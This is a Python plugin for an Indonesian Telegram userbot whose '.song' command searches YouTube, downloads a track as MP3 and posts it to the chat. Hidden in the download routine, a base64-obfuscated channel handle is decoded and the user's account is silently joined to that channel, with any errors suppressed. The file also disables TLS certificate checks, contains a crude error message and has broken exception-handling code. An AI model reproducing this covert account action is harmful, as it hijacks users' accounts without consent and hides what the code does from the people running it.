# Ported By Vicky / @Vckyouuu From Ultroid
# Jangan Dihapuss!!!
# Thanks Ultroid
# Full Love From Vicky For All Lord <- ini Alay by: Koala 🐨
# @LORDUSERBOT_GROUP


import json
import os

import pybase64
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import DocumentAttributeAudio
from youtube_dl import YoutubeDL
from youtube_dl.utils import (
    ContentTooShortError,
    DownloadError,
    ExtractorError,
    GeoRestrictedError,
    MaxDownloadsReached,
    PostProcessingError,
    UnavailableVideoError,
    XAttrMetadataError,
)
from youtubesearchpython import SearchVideos

from userbot.events import register
from userbot import CMD_HELP, ALIVE_NAME


@register(outgoing=True, pattern=r"^\.song (.*)")
async def download_video(event):
    await event.edit("`Proses Pencarian.....`")
    url = event.pattern_match.group(1)
    if not url:
        return await event.edit("**Syntax Error!**\nGunakan Perintah `.song <judul lagu>`")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await event.edit("`Proses Mencari Lagu...`")
    type = "audio"
    await event.edit(f"`Bersiap Download Lagu {url}...`")
    if type == "audio":
        opts = {
            "format": "bestaudio",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "writethumbnail": True,
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "320",
                }
            ],
            "outtmpl": "%(id)s.mp3",
            "quiet": True,
            "logtostderr": False,
        }
    try:
        await event.edit("`Proses Mendapatkan Informasi 🛸...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await event.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await event.edit("`Download Terlalu Pendek.`")
        return
    except GeoRestrictedError:
        await event.edit(
            "`Video tidak tersedia dari lokasi geografis Anda karena batasan geografis yang diberlakukan oleh situs web.`"
        )
        return
    except MaxDownloadsReached:
        await event.edit("`Download Musik Apa Bokep Nih Anjeng.`")
        return
    except PostProcessingError:
        await event.edit("`Terjadi Kesalahan Dalam Proses Download.`")
        return
    except UnavailableVideoError:
        await event.edit("`Media tidak tersedia dalam format yang diminta.`")
        return
    except XAttrMetadataError as XAME:
        await event.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await event.edit("`Terjadi kesalahan selama ekstraksi info.`")
        return
    except Exception as e:
        await event.edit(f"{str(type(e)): {str(e)}}")
        return
    try:
        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
        await bot(JoinChannelRequest(sung))
    except BaseException:
        pass
    upteload = """
Sabar, Sedang Proses..
Judul - {}
Pencipta - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await event.edit(f"`{upteload}`")
    await event.client.send_file(
        event.chat_id,
        f"{rip_data['id']}.mp3",
        supports_streaming=True,
        caption=f"**➻ Judul:** {rip_data['title']}\n**➻ Artis:** {rip_data['uploader']}\n**➻ 𝐅𝐢𝐧𝐝 𝐁𝐲:** {ALIVE_NAME}",
        attributes=[
            DocumentAttributeAudio(
                duration=int(rip_data["duration"]),
                title=str(rip_data["title"]),
                performer=str(rip_data["uploader"]),
            )
        ],
    )
    os.remove(f"{rip_data['id']}.mp3")

# For Lord - Userbot
# @Vckyouuu
# Alvin Lord Userbot

CMD_HELP.update(
    {
        "musically": "**Modules:** __Song__\n\n**Perintah:** `.song <judul>`"
        "\n**Penjelasan:** Mendownload Lagu"})
